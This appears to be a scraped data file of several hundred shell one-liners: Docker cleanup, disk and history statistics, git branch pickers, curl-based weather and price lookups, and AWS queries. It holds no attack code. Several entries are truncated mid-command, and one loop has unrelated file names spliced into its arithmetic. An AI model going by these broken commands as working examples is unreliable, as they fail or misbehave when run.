"echo \$(uprecords -a | head -n3 | tail -n1 | sed s/\-\>// | awk '{ print \$2, \$3, \$4 }')"
"echo -e ""€: $( web.btc_worldwide | grep -C2 Euro | grep -o [0-9\.]* )"" ; echo ""$: $( btc.worldwide | grep -C2 USD | grep -o [0-9\.]* )"""
"echo -e ""\e[1;31mLast Upgraded:\e[0m "" ; sort /var/log/pacman.log | tail -n 50 | grep upgraded | cut -c 1-18 | uniq -d"
"echo -e ""GET /containers/json?all=1 HTTP/1.0\r\n"" | nc -U /var/run/docker.sock | tail -n +5 | dockviz containers --dot | dot -Tpng -o /tmp/docker-containers.png && eog /tmp/docker-containers.png"
"echo -e ""Filesystem Size Used Avail Use% Mountpoint\n$(\df -hP | tail -n+2 | sort -k5nr -k4n )"" | column -t | grep -P "
"echo -e ""Enter the domain of your account (google.com etc.):\c"" ; read dname ; echo ""username: $(echo kanocyan@""$dname"" | md5sum -t - | cut -f1 -d "" "" - | md5sum -t - | cut -f1 -d "" "" -)"""
"echo '%CPU %MEM PID COMMAND' && ps hgaxo %cpu,%mem,pid,comm | sort -nrk1 | head -n 10 | sed -e 's/-bin//' | sed -e 's/-media-play//'"
"echo ' RSS %MEM %CPU COMMAND';\ps -e -o rssize,pmem,pcpu,args | sort -nr | cut -c-156 | head -500 | awk '{printf \"
"echo $PATH | tr "":"" ""\n"" | sort | uniq | less"
"echo $PATH | sed -e ""s/:/\n/g"" -e ""s|${HOME}|~|g"""
"echo $(($(find . | tr -cd ""/\n"" | sort | tail -1 | wc -c) -1))"
"echo $( curl -s ""http://www.vpnbook.com"" | grep -A 1 ""Username: vpnbook"" | tail -n 2 | cut -f2 -d "" "" | cut -f1 -d ""<"" )"
"echo ""scale=3; $(vim --startuptime /tmp/stime_mine.log -c 'quit' > /dev/null && tail -n 1 /tmp/stime_mine.log | cut -d ' ' -f1) / $(vim -u DEFAULTS --startuptime /tmp/stime_def.log -c 'quit' > /dev/null && tail -n 1 /tmp/stime_def.log | cut -d ' ' -f1)"" | bc | xargs -i echo {}x slower your Vim than the default."
"echo ""scale=3; $(nvim --startuptime /tmp/stime_mine.log -c 'quit' > /dev/null && tail -n 1 /tmp/stime_mine.log | cut -d ' ' -f1) / $(nvim -u DEFAULTS --startuptime /tmp/stime_def.log -c 'quit' > /dev/null && tail -n 1 /tmp/stime_def.log | cut -d ' ' -f1)"" | bc | xargs -i echo {}x slower your Vim than the default."
"echo ""saved to file""; (cd $SB; echo -e ""\n======-=======\n""; pwd ; date; jgit show | egrep -e ""^(>>|commit)"" | tr -s ""\n>"" ""\t\n"" ; echo ; jgit br*) | tee -a /home/jcano/notes/berwick_sb_snap.txt"
"echo ""ps auxf | grep -v grep | grep -i $* "" && ps auxf | grep -v grep | grep -i $*"
"echo ""main(i){for(i=0;;i++)putchar(((i*(i>>8|i>>9)&46&i>>8))^(i&i>>13|i>>6));}"" | gcc -x c - && ./a.out | aplay"
"echo ""main(i){for(i=0;;i++)putchar(((i*(i>>8|i>>9)&46&i>>8))^(i&i>>13|i>>6));}"" | gcc -x c - && ./a.out | aplay -f U16 -r 44100"
"echo ""main(i){for(i=0;;i++)putchar(((i*(i>>3|i>>11)&43&i>>8))^(i&i>>12|i>>4));}"" | gcc -x c - && ./a.out | aplay"
"echo ""main(i){for(i=0;;i++)putchar(((i*(i>>17|i>>9)&46&i>>3))^(i&i>>10|i>>100));}"" | gcc -x c - && ./a.out | aplay"
"echo ""export TERM=$TERM; stty rows $(tput lines) cols $(tput cols)"" | xsel -b && [[ $(ps -p $$ | grep bash) ]] && echo Terminal info copied to clipboard. || echo ""WARNING: not running as bash."" "
"echo ""`pwd`: `ls -1aR | grep -v ""\./"" | grep -v ""^$"" | grep -v ""\.:"" | wc -l` files for a total of `du -hs`"""
"echo ""`pwd`: `ls -1R | grep -v ""\./"" | grep -v ""^$"" | grep -v ""\.:"" | wc -l` files for a total of `du -hs`"""
"echo ""Your new generated passwd: ""; cat /dev/urandom | head -n10 | sha512sum | base64 | head -c 10 ;echo"
"echo ""Public: $(dig +short myip.opendns.com @resolver1.opendns.com)""; echo ""Internal: $(ip address show | grep inet\ | grep -v 127.0.0.1 | sed ""s/.*inet\ //"" | sed ""s/\/.*//"")"" "
"echo ""Disk space in root and home""; df -h | grep -E ""home|sda3""; echo ""---------------""; echo ""Current Directory"" ; du -hcd 1 . | egrep ""M|G"""
"echo ""$([ $? = 0 ] && echo finished || echo error)"" ""$(history|tail -n1|sed -e "
"du -s `pwd`/* | sort -nr | cut -f 2- | while read a; do du -sh ""$a""; done|head"
"du -s .[!.]* err.txt generated.file succ.txt | sort -rn | cut -f2 | tr ""\n"" ""\0"" | xargs -0 du -hsc"
"du -s . .. | sort -rn | cut -f2 | tr ""\n"" ""\0"" | xargs -0 -I {} du -sh ""{}"""
"du -s err.txt generated.file succ.txt | sort -rn | cut -f2 | tr ""\n"" ""\0"" | xargs -0 -I {} du -sh ""{}"""
"du -kxh | egrep -v ""\./.+/"" | (sort -h 2>/dev/null || sort)"
"dsh --file ~/.dsh/alertserver -M -r ssh -Mc -- ""tail -F /iad/finn/search-alertserver/logs/search-alertserver.log | egrep --line-buffered -v \""matched|monitor|SearchEvent|Got solrDoc\"""""
"dpkg-query -Wf '\${Installed-Size}\t\${Package}\t\${Priority}\n\' | egrep '\s(optional|extra)' | cut -f 1,2 | sort -n"
"dpkg -l | grep ""^i"" | awk ""{print $2}"" | xargs --max-args 1 aptitude why | grep ""^Unable"""
"dpkg -l | egrep ""linux\-(*image*|*headers*)\-[0-9]"" | egrep -v ""`uname -r | awk -F- "
"docker run -m 300M --cpus=""2"" openjdk:11-jre java -XX:+PrintFlagsFinal -version | grep -E ""(MAX|UseSerialGC|UseG1GC|MaxHeapSize)"""
"docker rmi $(docker images | grep ^classpass | tr -s "" "" | cut -f 3 -d "" "" | xargs)"
"docker rm $(docker ps -a | grep ""Exited"" | awk '{print $1}') && docker rm $(docker images -a | grep ""^<none>"" | awk '{print $3}')"
"docker rm $(docker ps -a -q) || true && docker rmi $(docker images | grep ""^<none>"" | awk ""{print $3}"")"
"docker ps | tail -n +2 | while read cid b; do echo -n ""$cid\t""; docker inspect $cid | grep IPAddress | cut -d \"" -f 4; done"
"docker ps | tail -n +2 | while read cid b; do echo -n ""$cid: ""; docker inspect $cid | grep IPAddress | cut -d \"" -f 4; done"
"docker ps -q | while read cid b; do echo -n ""$cid ""; d inspect $cid | jq -r "".[0].NetworkSettings.Networks | to_entries[] | .value.IPAddress""; done"
"docker ps -a |tail -n +2|tr -s "" ""|cut -d"" "" -f 1|xargs docker rm -f"
"docker ps -a | tail -n +2 | sed -E ""s/ +/ /g"" | cut -f1 -d"" "" | xargs docker rm -f $1"
"docker ps -a | grep ""Exited"" | awk ""{print $1}"" | xargs docker stop | xargs docker rm"
"docker ps -a | egrep ""Exited | Created"" | cut -f 1 -d "" "" | xargs docker rm"
"docker ps -a | egrep ""Created|Exited"" | cut -d"" "" -f1 | xargs docker rm"
"docker ps -a -q | xargs docker rm; docker images | grep ""^<none>"" | awk ""{print \$3}"" | xargs docker rmi"
"docker ps -a -f status=exited | grep -vi ""datacontainer"" | tail -n +2 | cut -c1-12 | xargs docker rm -v"
"docker ps -a -f status=exited | grep -vi ""datacontainer"" | tail -n +2 | cut -c1-12 | xargs --no-run-if-empty docker rm -v"
"docker images|tail -n +2|tr -s "" ""|cut -d"" "" -f 3|xargs docker rmi -f"
"docker images | tail -n +2 | sed -E ""s/ +/ /g"" | cut -f3 -d"" "" | xargs docker rmi -f $1"
"docker images | grep none | tr -s "" "" | cut -d"" "" -f 3 | xargs docker rmi"
"docker images | grep none | tr -s "" "" | cut -d "" "" -f3 | tr -s ""\n"" "" """
"docker images | grep '^<none>' | sed -e 's/ \\{1,\\}/ /g' | cut -d' ' -f 3 | xargs docker rmi"
"docker images | grep ""<none>"" | cut -c 42- | cut -c -12 | xargs docker rmi"
"docker images | awk ""{ print \$1}"" | tail -n +2 | sort | uniq"
"docker images --format ""{{.Repository}}:{{.Tag}}"" | grep -v ""<none>"" | sort | uniq | xargs -L1 docker pull"
"dmesg | grep -ie ""pl2303 converter now"" | tail -2 && dmesg | grep -ie ""FTDI USB Serial Device converter now"" | tail -4"
"dirs && find . -type d | sed -e ""s/[^-][^\/]*\// |/g"" -e ""s/|\([^ ]\)/|-\1/"""
"dig +short myip.opendns.com @resolver1.opendns.com || wget -qO /dev/stdout ""http://icanhazip.com"" || curl -s ""http://icanhazip.com"""
"diff ~/.cs =(cs |grep -e slot.@ |cut -d "" "" -f1 |cut -d ""@"" -f2 |uniq)"
"df -lh|grep -ve ""/run\|overlay\|shm\|tmpfs"""
"df -lPH | awk ""NR==1 || /^tmpfs/"" | sort -hk3"
"df -hT | /usr/bin/egrep -i ""file|^/|^tank|/tmp$"""
"df -hT 2>&1 | egrep ""^/dev|^[[:blank:]]"" && (echo -n ""Partitions physiques: "" ; df -hT | egrep ^/dev/ | wc -l )"
"df -h | egrep""udev|tmpfs"" -v | egrep ""G|%"" --color"
"df -h | egrep -v ""tmpfs|overlay2|containers"" | column -t"
"df -h | egrep -v ""devfs|fdescfs|procfs|basejail"""
"declare -F | sed ""/iterm2/d"" | sed ""s/declare -f //""; alias | sed ""s/alias //"" | sed ""s/=.*//"""
"debuild ""-i(.git|.svn|.travis.yml|.idea|cmake-build-debug)"" -S -sd"
"debuild ""-i(.git|.svn|.travis.yml|.idea|cmake-build-debug)"" -S -sa"
"deactivate || true ; rm -rf venv-** || true ; python -m venv venv-$(basename ""$PWD"") && . venv-$(basename ""$PWD"")/bin/activate && pip install --quiet --upgrade pip && pip install --quiet --requirement requirements.txt"
"dd if=/dev/urandom count=1 2> /dev/null | md5sum | sed -e 's,^\([! ]*\).*$,add :0 . \1,' | tee /dev/stderr | xauth"
"dc ps | egrep ""erp|p_api|mongo|erp_frontend"""
"date | tee /home/fokhrul/fulldate.txt | cut -d "" "" -f 1 | tee /home/fokhrul/shortdate.txt | xargs echo hello there!"
"date | tee /fulldate.txt | cut --delimiter="" "" --fields=1 | tee/shortdate.txt | xargs echo hello"
"date | tee $HOME/Documents/fulldate.txt | cut -d "" "" -f 1 | tee $HOME/Documents/dayweek.txt | xargs echo ""Hello"""
"cvs status | grep -v ""^ "" | grep -v ""^$"" | grep -v = | grep -v ""Status: Up-to-date"""
"cvs status 2>/dev/null | grep -A3 Locally.Modified | grep Repository | cut -d/ -f7- | cut -d, -f1"
"cvs status 2>&1 | fgrep -v .swp | fgrep -v .DS_Store | grep -E ""^((\?.*)|(.*Status: [^U]))"""
"cut -f1 -d"" "" ~/.zsh_history | sort | uniq -c | sort -nr | head -n 30"
"cut -f1 -d"" "" ~/.zsh_history | sort | uniq -c | sort -nr | head -n
"cut -f1 -d"" "" ~/.zsh_cache/history | sort | uniq -c | sort -nr | head -n 30"
"cut -f1 -d"" "" ~/.bash_history | sort | uniq -c | sort -nr | head -n 30"
"cut -f1 -d"" "" ~/.bash_history | sort | uniq -c | sort -nr | head -n 20"
"cut -f1 -d"" "" ~/.bash_history | sort | uniq -c | sort -nr | head -n 10"
"cut -f1 -d"" "" .bash_history | sort | uniq -c | sort -nr | head -n 50'"
"cut -f1 -d"" "" .bash_history | sort | uniq -c | sort -nr | head -n 30"
"cut -f1 -d"" "" $HISTFILE | sort | uniq -c | sort -nr | head -n 30"
"cut -f1 -d"" "" ""$HISTFILE"" | sort | uniq -c | sort -nr | head -n 30"
"cut -f1 -d "" "" ~/.bash_history | sort | uniq -c | sort -nr | head -12"
"cut -d "" "" -f1 ~/.bash_history | sort | uniq -c | sort -nr | head -10"
"cut -d "" "" -f 1 < $HISTFILE | sort | uniq -c | sort -nr | head -n 10"
"curl http://24.232.0.118/asp/nivelesPrima.asp | grep ""valor"" | grep ""dB"" | cut -d "">"" -f2 | cut -d ""<"" -f1"
"curl -w ""\n| Downloaded %{size_download} bytes | Uploaded %{size_upload} bytes | Total-Time %{time_total} sec |\n"""
"curl -si http://pb/ --data-urlencode ""name=abhijeet.ras"" -d lang=text --data-urlencode code@- -d submit=submit -d expire=0 | grep ""Location: "" | cut -d"":"" -f2- | sed ""s/\\r//g"" | sed ""s/view/view\/raw/g"""
"curl -sH ""Authorization: token ${GITHUB_API_TOKEN}"" ""https://api.github.com/repos/$(ghq list | sed s#github.com\/##g | peco)/pulls"" | jq "".[] | { number: .number, title: .title, base: .base.ref, head: .head.ref }"""
"curl -s http://wttr.in/Wallenhorst\?lang\=de | grep -vE ""(New|Follow|Neue|Folgen)"""
"curl -s http://feeds.bbci.co.uk/news/rss.xml | grep ""<title>"" | sed ""s/.*[0-9].*[0-9]:.*[[:space:]]<title><\!\[CDATA\[//g;s/\]\]><\/title>//;"" | grep -v ""BBC News"" | head -n 10"
"curl -s http://feeds.bbci.co.uk/news/rss.xml | grep ""<title>"" | sed ""s/ <title><\!\[CDATA\[//g;s/\]\]><\/title>//;"" | grep -v ""BBC News"" | head -n 10"
"curl -s http://checkip.dyndns.org/ | grep "" IP Address:"" | cut -d\ -f4- | cut -d\< -f1 | /usr/local/bin/growlnotify -s"
"curl -s 'http://rss.accuweather.com/rss/liveweather_rss.asp?metric=1&locCode=en|us|springdfield-or|97477' | sed -n '/Currently:/ s/.*: \(.*\): \([0-9]*\)\([CF]\).*/\2°\3, \1/p'"
"curl -s 'http://rss.accuweather.com/rss/liveweather_rss.asp?metric=1&locCode=en|us|brooklyn-ny|11215' | sed -n '/Currently:/ s/.*: \(.*\): \([0-9]*\)\([CF]\).*/\2°\3, \1/p'"
"curl -s 'http://rss.accuweather.com/rss/liveweather_rss.asp?metric=1&locCode=EUR|RO|RO010|BUCURESTI' | sed -n '/Currently:/ s/.*: \(.*\): \([0-9]*\)\([CF]\).*/\2°\3, \1/p'"
"curl -s 'http://rss.accuweather.com/rss/liveweather_rss.asp?imperial=1&locCode=en|us|springdfield-or|97477' | sed -n '/Currently:/ s/.*: \(.*\): \([0-9]*\)\([CF]\).*/\2°\3, \1/p'"
"curl -o ""-"" `curl -o ""-"" ip138.com 2>&1 | ggrep -o ""src=\""[^\""]*\"""" | ggrep -o ""http[^\""]*"" | ggrep ""ic.asp""` 2>&1 | ggrep -o ""\[[0-9\.]*\]"""
"curl -L ""http://www.google.com/finance/converter?a=1&from=eur&to=pln&hl=es"" 2>/dev/null | grep result | grep -oE ""[^<span class=bld>>]?[^<>]+"" |grep PLN | cut -d"" "" -f 1 "
"curl --insecure 'https://192.168.50.135:10443/ajax/general/get_config?type=12' | xq -x '. | { Audio: .Information.Audio, HDMISignalInfo: .Information.Video.HDMISignalInfo }' | prettier --parser xml | bat -l html"
"ctags --langmap=php:.engine.inc.module.theme.php.install.test.profile --php-kinds=cdfi --languages=php --recurse --exclude=""\.git"" --exclude=""\.svn"" --exclude=""\.hg"" --exclude=""\.bzr"" --exclude=""\CVS"" --totals=yes --tag-relative=yes --regex-PHP=""/abstract\s+class\s+([^ ]+)/\1/c/"" --regex-PHP=""/interface\s+([^ ]+)/\1/c/"" --regex-PHP=""/(public\s+|static\s+|abstract\s+|protected\s+|private\s+)function\s+\&?\s*([^ (]+)/\2/f/"""
"crab -status | tee status | awk ""/^[0-9]/{print \$2}"" | sort | uniq -c"
"conda env list | grep \""^anaconda-[0-9]\{8\}\"" | cut -d\"" \"" -f1 | sort | tail -n 1"
"conda deactivate; PATH=$(echo $PATH | sed -e ""s|${CONDA_PATH}/bin:||"")"
"commandhistory | grep -Fxv ""$(listselfdefined)"" | sort | uniq -c | sort -n"
"commandhistory | grep -Fx ""$(listselfdefined)"" | sort | uniq -c | sort -n"
"comm -23 <(apt-mark showmanual | sort -u) <(gzip -dc /var/log/installer/initial-status.gz | sed -n ""s/^Package: //p"" | sort -u) | less"
"cmus-remote -C status | grep "" artist \| album \| title"" | cut -d "" "" -f 2-"
"clear && cat /etc/hosts | egrep -v ""^#|^\:|\:\:|^[[:space:]]*$"""
"cdf $(pwd | sed ""s|/Users/aermolenko/||"")"
"cd_log;tail -f apps.out | grep -v ""INFO \[Lix\]"" | grep -v ""INFO \[ClientAdapter\]"" | grep -v ""INFO \[ZkBasedSchemaRegistry\]"" | grep -v ""INFO \[DatabusHttpV3ClientImpl\]"""
"cd ~/git/org && git add -A && git commit -m ""`date`"" || git pull --rebase && git push origin HEAD || cd $OLD"
"cd `z |selecta|rev|cut -d "" "" -f1 | rev`"
"cd `echo $1 | sed ""s|$home|~|""`"
"cd /usr/share/icons/gnome && find . -maxdepth 1 -type d -exec basename ""{}"" \; |sort -n| cut -d ""x"" -f1 | xargs | sed ""s/\. //g"""
"cd /usr/share/dict; for n in {1..10}; do for f in propernames connectives words words; do i=`od -vAn -N4 -tu4 < /dev/urandom`; let ""j = $i%$(wc -l $f | xargs echo | cut -d\ -f1)""; head -$j $f| tail -1; done | xargs ; done; cd -"
"cd /tmp && npm i express && echo ""require(\""express\"")().get(\""*\"",(_,r)=>{\n\tconsole.log(process.env.PORT||1016);\nr.end();\n}).listen(process.env.PORT || 1026)"" > http.js && node http.js"
"cd .ne >& ~/_ && see || ( find .sw/.sw/.description >& ~/_ && echo ""You do not have a key that can open this door."" ) || echo ""You cannot go that way."" ; find .n >& ~/_ && rm ~/HW1/usr/toukmond/key.o >& ~/_ ; ig"
"cd $(vagrant global-status | grep -e ""^[a-z0-9]\{7\}"" | tr -s "" "" | cut -d"" "" -f 5 | peco)"
"cd $(vagrant global-status | egrep ""^[a-z0-9]{7}"" | tr -s "" "" | cut -f 5 -d"" "" | peco)"
"cd ""$(xmms2 info | grep file:// |cut -d: -f2 |xargs -0 dirname |python3 -c ""import sys,urllib.parse;sys.stdout.write(urllib.parse.unquote_plus(sys.stdin.read()))"")"""
"cat ~/.zsh_history|cut -d ';' -f 2- 2>/dev/null|awk '{a[$1]++ } END{for(i in a){print a[i] "" "" i}}'|sort -rn|head -25"
"cat ~/.texlive/texmf-var/luatex-cache/generic/names/otfl-names.lua | grep familyname | cut -d ""\"""" -f 4 | sort | uniq"
"cat ~/.ssh/config | grep -E ""^(# .*Hosts|Host [^*])"" | sed ""s/# \(.*\)/\1/g"" | sed ""s/^Host /- /g"""
"cat ~/.bash_profile | grep ""alias "" | sed -e ""s/alias //g"" | sed -e ""s/=.*//g"" | sort"
"cat ~/.bash_profile | egrep '^alias' | cut -d' ' -f2- | cut -d'=' -f1,2 | tr '=' '\t'"
"cat ~/.bash_aliases | grep -P ""(alias [a-z-]{3,}=\"")|(export )"" | sed -r ""s/^\s+//"" | less"
"cat package.json | jq -r "".scripts | keys[]"" | fzf | xargs yarn"
"cat makelog.txt | grep -E \""error|warning\"" | grep -v \""\-Wunused-value\"" | grep -v \""\-Wdeprecated-declarations\"""
"cat /var/log/nginx/access.log | sort | column -t -s ""\[\]\(\)\"""" | grep -v 199.66.69.218 | less"
"cat /var/log/dpkg.log | awk '{print \$3,\$4}' | grep '^install' | awk '{print \$2}' | awk -F ':' '{print \$1}'"
"cat /usr/share/dict/words | egrep ""^[a-z]{3,8}$"" | shuf -n4 | paste - - - - | column -t -o "" """
"cat /proc/cpuinfo| grep ""physical id""| sort| uniq| wc -l"
"cat /proc/cpuinfo | egrep ""^flags"" | sort -u | egrep -wc ""vmx|svm"""
"cat /dev/urandom |LC_CTYPE=C tr -dc ""[:graph:]"" | tr -d ""1Il0O~^"" | fold -w 12 | head -n 10"
"cat /dev/urandom | tr -dc '\\/,.!@#$%^*{}[];:|~&()a-zA-Z0-9_+-' | fold -w 100 | head -n 1"
"cat /dev/urandom | strings | mkpasswd -s|sed ""s/\//a/""|sed ""s/\./b/"""
"cat .env* | egrep ""^PORT"" | egrep -o ""[0-9]+$"" | xargs -i{} lsof -ti :{} | xargs kill -9"
"cat .env .env-override | egrep ""^PORT"" | egrep -o ""[0-9]+$"" | xargs -i{} lsof -ti :{} | xargs kill -9"
"cat $HISTFILE | tail -n 2 | sed -n 1p | sed -r 's/^:.{0,14};//' | cb"
"cat ""${__BASH_ALIASES}"" | grep -E ""^$|^# [A-Z]|^alias [a-z.]|^ alias\b"" --color=never"
"bundle exec rubocop -a -D $(git diff --cached --name-only --diff-filter=d HEAD | egrep "".(rb|rake)$"" | egrep -v ""db\/schema.rb"" | egrep -v ""lib\/pb"") Gemfile"
"bundle exec rspec $(git status | grep spec | grep ""modified: "" | cut -d: -f2- | tr ""\n"" "" "")"
"bundle exec rake testbot:rspec 2>&1 | tee tmp/output.txt | grep ""^\(Finished.*\.$\|rspec\|\d\+ examples\)"""
"bundle exec rake testbot:rspec 2>&1 | tee tmp/output.txt | grep ""^\(Finished.*\.$\|rspec\|[0-9]\+ examples\)"""
"bugzilla --ensure-logged-in query --product ""Red Hat Enterprise Linux 7"" --component sos -t NEW,ASSIGNED,POST,MODIFIED,ON_DEV,ON_QA --outputformat ""%{id} | %{bug_status} | %{assigned_to} | %{short_desc} | %{flags}"""
"bugzilla --ensure-logged-in query --product ""Red Hat Enterprise Linux 6"",""Red Hat Enterprise Linux 7"" --component sos -t NEW --outputformat ""%{id} | %{bug_status} | %{assigned_to} | %{short_desc}"" | sort -k 2"
"bugzilla --ensure-logged-in query --product ""Red Hat Enterprise Linux 6"" --component sos -t NEW,ASSIGNED,POST,MODIFIED,ON_DEV,ON_QA --outputformat ""%{id} | %{bug_status} | %{assigned_to} | %{short_desc} | %{flags}"""
"bugzilla --ensure-logged-in query --assigned_to sbradley@redhat.com --blocked 1274384 --outputformat ""%{id} | %{component} | %{bug_status} | %{assigned_to} | %{short_desc}"""
"btcPrice=`curl -s http://api.coindesk.com/v1/bpi/currentprice.json | jq ""[.bpi.EUR.rate_float]"" | grep -v ""\["" | grep -v ""\]"" | tr -d "" ""`; btcPriceUnit=""$btcPrice"".""EUR""; echo ""1BTC=$btcPriceUnit"""
"bot-lcm-tunnel -l udpm://239.255.76.67:62237 -S ""(SIM_|_AF_|_AR).*"" -R ""(SIM_|_AF_|_AR).*"""
"bitbake -g axis-image-cvp && cat pn-depends.dot | grep -v -e ""-native"" | grep -v digraph | grep -v -e ""-image"" | awk "
"bind -p | \grep -E --color -v ""self-insert|not bound|do-lowercase-version"" | \grep --color -P "
"bind -P | grep not -v | cut -d"" "" -f1,6,7,8,9,10,11 | sed ""s/[\""\\,.]//g"" | column -t"
"beep && notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"aws ec2 describe-instances | jq '[.Reservations[].Instances[] | {BlockDevice: [.BlockDeviceMappings[] | {DeviceName, Status: .Ebs.Status, VolumeId: .Ebs.VolumeId}], Tags: [.Tags[] | {(.Key): (.Value)}], PublicIpAddress, State, InstanceId}]' 2>/dev/null"
"aws ec2 describe-instances --output text --region ap-southeast-1 --filter 'Name=vpc-id,Values=vpc-457e9320' --query 'Reservations[*].Instances[*].[State.Name, Tags[?Key==\`Name\`].Value | [0], PrivateIpAddress]' | sed -e 's/^running/R/g' | sed -e 's/^stopped/S/g' | peco"
"aws ec2 describe-instances --output text --query 'Reservations[*].Instances[*].[State.Name, Tags[?Key==\`Name\`].Value | [0], PublicDnsName, PrivateDnsName]' | sed -e 's/^running/R/g' | sed -e 's/^stopped/S/g' | peco"
"aws ec2 --region $(curl -s 169.254.169.254/latest/dynamic/instance-identity/document|jq -Mrc .region) describe-tags --filters Name=resource-id,Values=$(curl -s 169.254.169.254/latest/meta-data/instance-id) | jq -Mrc ""[.Tags[]|{(.Key):.Value}]|add"""
"aws --profile MyZebraUser ec2 describe-instances --filters ""Name=instance-state-name,Values=running"" ""Name=tag-key,Values=Name"" | jq -r "".Reservations[].Instances[].Tags[] | select(.Key==\""Name\"") | .Value + \"".zbra.io\"""" | sort -u> ~/.ssh/zebra_hosts"
"awk '{print \$4,\$5,\$6,\$7,\$8,\$9,\$10,\$11,\$12,\$13,\$14,\$15}' /var/log/messages | sed -e 's/\\[[0-9]*\\]:/:/' | sort | uniq | more"
"apache.status; mysql.status; php.status; ps -acx -o pid,user,command | egrep 'http[d]|mysql[d]|php-fpm|dnsmasq'"
"alias | grep -v ""cd"" | grep -v ""color"" | cut -c 7- | grep "".*="""
"alias | grep -n $lookfor | cut -f1 | sed -n ""$1""p ~/.bashrc | grep $lookfor"
"alarm && notify-send --urgency=critical -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"agl ""(TODO|todo).*(([sS](mithers|MITHERS))|JJS|jjs)"" -A 2 -B 2"
"ag -G ""\.(c|cc|cpp|C|CC)$"""
"ack --nobreak --nocolor ""(TODO|FIXME):""|sed -E ""s/(.*:[[:digit:]]+):.*((TODO|FIXME):.*)/\2 :>> \1/""|grep -E --color=always "":>>.*:\d+"""
"ack ""^Exception"" ""$1"" | sort | uniq -c | sort -nr | vi -c ""set nowrap"" -"
"a=1;x=1;y=1;xd=1;yd=1;while true;do if [[ $x == $LINES || $x == 0 ]]; then xd=$(( $xd *-1 )) ; fi ; if [[ $y == $COLUMNS || $y == 0 ]]; then yd=$(( $yd err.txt generated.file succ.txt -1 )) ; fi ; x=$(( $x + $xd )); y=$(( $y + $yd )); printf ""\33[%s;%sH\33[48;5;%sm \33[0m"" $x $y $(($a%199+16)) ;a=$(( $a + 1 )) ; sleep 0.001 ;done"
"`git status -s | sed ""s/\s/\.\.\./g"" | sed ""s/^\.\.\./ /"" | peco --prompt ""GIT FILES>"" | sed ""s/^.\{2\}\.\.\.//""`"
"`git branch -a |peco --prompt ""GIT BRANCH>"" | head -n 1 | sed -e ""s/^\*\s*//g"" |sed -e ""s/remotes\/origin\///g""`"
"`git branch -a | percol --query ""remotes/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s/^\*\s*//"" | sed ""s/remotes\/\([^\/]*\)\/\(.*\)/\2 \1\/\2/""`"
"`git branch -a | peco --query ""remotes/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s/^\*\s*//"" | sed ""s/remotes\/[^\/]*\/\(\S*\)/\1/""`"
"`git branch -a | peco --query ""remotes/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s/^\*\s*//"" | sed ""s/remotes\/[^\/]*\/\(\S*\)/\1 \0/""`"
"`git branch -a | peco --query ""remotes/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s/^\*\s*//"" | sed ""s/remotes\/[^\/]*\/\(\S*\)/\1 /""`"
"`git branch -a | peco --query ""remotes/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s/^\*\s*//"" | sed ""s/remotes\/[^\/]*\/\(\S*\)//""`"
"`git branch -a | peco --query ""remotes/ "" --prompt ""GIT REMOT BRANCH>"" | head -n 1 | sed ""s/^\*\s*//"" | sed ""s/remotes\/[^\/]*\/\(\S*\)/\1 \0/""`"
"`git branch -a | peco --prompt ""BRANCH>"" | head -n 1 | sed -e ""s/^\*\s*//g"" | xargs git checkout`"
"`git branch --all | grep -v HEAD | fzf -m | sed ""s/.* //"" | sed ""s#remotes/[^/]*/##""`"
"`echo S | sed ""s/\([0-9a-f]*\)/\1..\1^/"" | xargs git diff --name-only | percol --prompt ""GIT DIFF FILE>"" | sed ""s/^\(\S*\).*/\1/""`"
"`docker images | tail -n +2 | peco | tr -s "" "" | cut -d"" "" -f3`"
"_nstat_text=$(lynx -dump --width 240 http://localhost:6789/server-status | awk ""/PID.*Acc/{flag=1}/_____/{flag=0}flag"") ; echo ""${_nstat_text}"" | head -n 1 ; echo ""${_nstat_text}"" | tail -n +2 | sort -rnk5"
"_f(){ eval `synclient | grep TouchpadOff | tr -d "" ""`; [[ $TouchpadOff == 1 ]] && V=0 || V=1;synclient TouchpadOff=$V }; _f"
"__lshis() { local p=""$*"";history | estrip -u | grep -i ""${p:-""""}"" | grep -v grep | grep -v hisp; unset -f __lshis; }; __lshis"
"__df_findmnt() { [[ ""$1"" == ""-h"" || -z ""$1"" ]] && findmnt -D || df ""$@""; }; __df_findmnt"
"\svn ls ^/tags -v | awk '{ print \$1,\$6 }' | sort -n | grep -v '\./$' | awk '{ print \$2 }'"
"\notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"\grep ""#@p-help@"" ~/.bash.d/p-package-manager.sh | \grep --invert-match ""alias p-help="" | \sed -e ""s/#@p-help@//; s/^alias / /; s/^#---- //; s/^#//; s/ *$//; s/=\""/##/; s/\""//;"" | \column -s ""##"" -t -e | \less --no-init --quit-if-one-screen "
"\'bash -c \""if [ -d ~/etc/puppet-manifests ]; then cd ~/etc/puppet-manifests && (git pull -q || true); fi && cd ~/etc/puppet/ && (git pull -q || true) && librarian-puppet install --quiet && echo \\\""Done!\\\""\""\'' > ~/.bash_aliases"
"\""screen -ls | grep Detached | cut -d. -f1 | awk '{print \$1}' | xargs kill\"""" >> ~/.bash_aliases"
"\""nvim -u /tmp/.dimonluk_vimrc || vim -u /tmp/.dimonluk_vimrc || vi -u /tmp/.dimonluk_vimrc\"""" >> /tmp/.zshrc &&"
"\""history | tail -n2 | sed -n '1p' | sed 's/^[0-9 ]*//' | sed 's/sudo //' >> /vagrant/bootstrap.sh\"""
"\""find . | sed 's/[^/]*\//| /g;s/| *\([^| ]\)/+--- \1/'\"""
"\""find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'\""\n"" >> $HOME/.bash_profile"
"\""find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'\"""" >> ~/.bash_profile"
"\""echo \$(ifconfig eth1 | grep 'inet addr:' | cut -d: -f2 | awk '{ print \$1}')\"""" | tee ~/.profile"
"\""dig -x \$(dig +short myip.opendns.com @resolver1.opendns.com) | grep PTR | grep -v \; | awk '{print \$5}' | cut -d. -f1-3\"""
